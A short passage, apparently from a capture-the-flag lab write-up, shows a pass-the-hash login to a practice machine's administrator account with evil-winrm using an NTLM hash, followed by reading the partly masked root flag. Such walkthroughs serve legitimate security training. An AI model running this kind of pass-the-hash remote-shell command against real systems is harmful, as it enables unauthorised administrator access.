@@ -1,0 +1,1 @@
+ell as administrator: oxdf@hacky$ evil-winrm -i blazorized.htb -u administrator -H f55ed1465179ba374ec1cad05b34a5f3 Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> And I can grab root.txt : *Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt 4712105c************************
